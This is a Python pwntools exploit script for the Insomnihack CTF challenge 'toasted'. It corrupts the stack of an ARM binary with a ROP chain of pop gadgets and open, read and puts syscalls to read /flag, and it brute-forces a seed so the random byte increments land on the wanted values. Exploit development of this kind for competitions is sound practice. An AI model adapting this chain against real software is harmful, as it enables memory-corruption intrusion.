from pwn import *

# Note: this needs rand_table generated by create_rand_table.cpp

fd=9

# This is stack dump from moment in handle_bread()
dump="""
0xf6ffecc8: 0   0   0   0   0   0   0   0
0xf6ffecd0: 0   0   0   0   0   0   0   0
0xf6ffecd8: 0   0   0   0   0   0   0   0
0xf6ffece0: 0   0   0   0   0   0   0   0
0xf6ffece8: 0   0   0   0   0   0   0   0
0xf6ffecf0: 0   0   0   0   0   0   0   0
0xf6ffecf8: 0   0   0   0   0   0   0   0
0xf6ffed00: 0   0   0   0   0   0   0   0
0xf6ffed08: 0   0   0   0   0   0   0   0
0xf6ffed10: 0   0   0   0   0   0   0   0
0xf6ffed18: 76  105 110 117 120 0   0   0
0xf6ffed20: 0   0   0   0   0   0   0   0
0xf6ffed28: 0   0   0   0   0   0   0   0
0xf6ffed30: 93  100 2   0   -96 -72 6   0
0xf6ffed38: -25 -72 6   0   1   0   0   0
0xf6ffed40: 0   0   0   0   -35 99  2   0
0xf6ffed48: 93  100 2   0   -96 -72 6   0
0xf6ffed50: -25 -72 6   0   1   0   0   0
0xf6ffed58: 0   0   0   0   -35 99  2   0
0xf6ffed60: 0   0   0   0   -35 99  2   0
0xf6ffed68: -96 -72 6   0   1   0   0   0
0xf6ffed70: 54  1   0   0   88  -73 6   0
0xf6ffed78: 54  1   0   0   29  -13 1   0
0xf6ffed80: -96 -72 6   0   -47 58  5   22
0xf6ffed88: -104    -57 6   0   112 -86 26  -16
0xf6ffed90: 8   -17 -1  -10 -72 -19 -1  -10
0xf6ffed98: 97  -110    0   0   0   0   0   0
0xf6ffeda0: 96  -74 6   0   121 -106    0   0
0xf6ffeda8: 112 -86 26  -16 0   0   0   0
0xf6ffedb0: -72 -19 -1  -10 -109    -116    0   0
0xf6ffedb8: 84  -16 -1  -10 1   0   0   0
0xf6ffedc0: 112 -86 26  -16 0   0   0   0
"""
# Memory
initial_memory=[]
for line in dump.split("\n"):
    spl=line.split(" ")[1:]
    for mem in spl:
        if mem=="":
            continue
        initial_memory.append((int(mem)+256)%256)

wanted_memory=initial_memory[:]
wanted_buff=[0]*256

# We only can use 4 overheats (changes to 0).
# All other changes have to be byte increases.

base_addr  =0xf6ffedc8 # buff[0]
return_addr=0xf6ffedb4

def need_byte(b, addr):
    if addr<base_addr:
        wanted_memory[addr-base_addr]=b
    else:
        wanted_buff[addr-base_addr]=b

# HERE, ADD YOUR PAYLOAD

need_byte(ord("/"), return_addr-8)
need_byte(ord("f"), return_addr-7)
need_byte(ord("l"), return_addr-6)
need_byte(ord("a"), return_addr-5)
need_byte(ord("g"), return_addr-4)
need_byte(ord("\x00"), return_addr-3)
# 0x90ec pop.w {r4, r5, r6, r7, r8, sb, sl, fp, pc}
need_byte(0xed, return_addr)
need_byte(0x90, return_addr+1)
# 0x11e98 pop {r0, r1, r6, r7, pc}
need_byte(0x99, return_addr+36)
need_byte(0x1e, return_addr+37)
need_byte(0x01, return_addr+38)
# r0 - "/flag"
need_byte(0xac, return_addr+40)
need_byte(0xed, return_addr+41)
need_byte(0xff, return_addr+42)
need_byte(0xf6, return_addr+43)
# r7 - sys_open
need_byte(0x05, return_addr+52)
# Syscall and pop {r7, pc}
need_byte(0x95, return_addr+56)
need_byte(0x92, return_addr+57)
# 0x00019b04 pop {r0, r1, r2, r3, r4, r7, pc}
need_byte(0x05, return_addr+64)
need_byte(0x9b, return_addr+65)
need_byte(0x01, return_addr+66)
# r0 - 6 (fd)
# TEMP CHANGE
need_byte(fd, return_addr+68)
# r1 - "/flag" (used as buffer to write actual contents)
need_byte(0xac, return_addr+72)
need_byte(0xed, return_addr+73)
need_byte(0xff, return_addr+74)
need_byte(0xf6, return_addr+75)
# r2 - 255 bytes
need_byte(0x30, return_addr+76)
# r7 - sys_read
need_byte(0x03, return_addr+88)
# Syscall and pop {r7, pc}
need_byte(0x95, return_addr+92)
need_byte(0x92, return_addr+93)
# 0x0001ae30 pop {r0, r2, r6, pc}
need_byte(0x31, return_addr+100)
need_byte(0xae, return_addr+101)
need_byte(0x01, return_addr+102)
# r0 - our buffer with flag contents
need_byte(0xac, return_addr+104)
need_byte(0xed, return_addr+105)
need_byte(0xff, return_addr+106)
need_byte(0xf6, return_addr+107)
# puts (second instruction, just after push)
# note: last instruction is pop.w {r4, r5, r6, r7, r8, pc}
need_byte(0x95, return_addr+116)
need_byte(0x9b, return_addr+117)

#r7
need_byte(0x9c, return_addr+132)
need_byte(0xed, return_addr+133)
need_byte(0xff, return_addr+134)
need_byte(0xf6, return_addr+135)
# finally, jumping to read in handle_bread
need_byte(0x7d, return_addr+140)
need_byte(0x8a, return_addr+141)



# Now calculating changes to memory.

hard_changes=[]
easy_changes=[]
buff_changes=[]

for i in range(len(initial_memory)):
    index=-1-i
    if wanted_memory[index]>initial_memory[index]:
        easy_changes.append(index)
    if wanted_memory[index]<initial_memory[index]:
        hard_changes.append(index)
for i in range(256):
    if wanted_buff[i]>0:
        buff_changes.append(i)

print "Easy_changes:"
for ech in easy_changes:
    print ("At index "+str(ech)+": from "+hex(initial_memory[ech])+
            " to "+hex(wanted_memory[ech]))
print "Hard_changes:", hard_changes
for hch in hard_changes:
    print ("At index "+str(hch)+": from "+hex(initial_memory[hch])+
            " to "+hex(wanted_memory[hch]))
print "Buff_changes:", buff_changes
for bch in buff_changes:
    print ("At index "+str(bch)+": from 0x00"+
            " to "+hex(wanted_buff[bch]))

if len(hard_changes)>3:
    print "Too many hard changes! Try to produce better payload..."
    sys.exit(0)

print "Preprocessing random values..."
f=open("rand_table")
randtable=[]
for line in f.readlines():
    row=[]
    for val in line.split(" "):
        if val.strip()!='':
            row.append(int(val)%256)
    randtable.append(row)
randtable=randtable[:-5]
f.close()

def get_random_values(seed):
    return randtable[seed]

def try_change(used, values, from_val, to_val):
    # Using some (not many) elements from values, that are not used,
    # sum them to create a to_val-from_val.
    wanted=to_val-from_val
    # Try to find an exact match:
    for i in range(len(used)):
        if values[i]==wanted and not used[i]:
            return [i]
    # Try to compose it from two values:
    for i in range(len(used)):
        if values[i]<wanted and not used[i]:
            for j in range(len(used)):
                if values[i]+values[j]==wanted and not used[j]:
                    return [i, j]
    return []
        

def test_seed(seed):
    values=get_random_values(seed)
    used=[False]*256
    changes=[]
    i=0
    for j in range(len(hard_changes)):
        mem=initial_memory[hard_changes[j]]
        while True:
            mem+=values[i]
            used[i]=True
            changes.append((i, hard_changes[j]))
            i=i+1
            if i>=256:
                return (False,[])
            if mem>256:
                break
    # At this point, we used several (maybe ten or so) random values to reset hard
    # values to zero. Now we have to generate a sequence of additions that
    # will increment easy_changes to their correct values.
    for hch in hard_changes:
        from_val=0 # Had ressetted
        to_val=wanted_memory[hch]
        res=try_change(used, values, from_val, to_val)
        if len(res)==0:
            return (False, [])
        for ch in res:
            used[ch]=True
            changes.append((ch, hch))

    for ech in easy_changes:
        from_val=initial_memory[ech]
        to_val=wanted_memory[ech]
        res=try_change(used, values, from_val, to_val)
        if len(res)==0:
            return (False, [])
        for ch in res:
            used[ch]=True
            changes.append((ch, ech))

    for bch in buff_changes:
        from_val=0
        to_val=wanted_buff[bch]
        res=try_change(used, values, from_val, to_val)
        if len(res)==0:
            return (False, [])
        for ch in res:
            used[ch]=True
            changes.append((ch, bch))
    
    return (True, changes)

def find_good_seed():
    seed=0
    while seed<len(randtable):
        res=test_seed(seed)
        if res[0]:
            return (seed, res[1])
        seed=seed+1
    print "Good seed not found..."
    sys.exit(0)

print "Looking for good seed..."
res=find_good_seed()
seed=res[0]
changes=dict(res[1])
print "Found seed:",seed
print "Expected randomness:", get_random_values(seed)
print "Changes:",changes

context.log_level="debug"
if len(sys.argv)>1:
    if sys.argv[1]=="remote":
        r=remote("toasted.insomnihack.ch", 7200)
    else:
        r=process("./qemu-arm -strace toasted", shell=True)
else:
    r=process("./qemu-arm -strace -g 9119 toasted", shell=True)
r.send("How Large Is A Stack Of Toast?\n\0")
time.sleep(0.5)
r.send(p32(seed))
time.sleep(0.5)
def sendnum(num):
    num=str(num)
    num=num+"\x00"*(4-len(num))
    r.send(num)
    r.recv()

for i in range(256):
    if i in changes:
        num=changes[i]
        sendnum(num)
    else:
        num=-690+i
        sendnum(num)

r.send("x000")
time.sleep(0.2)


r.interactive()
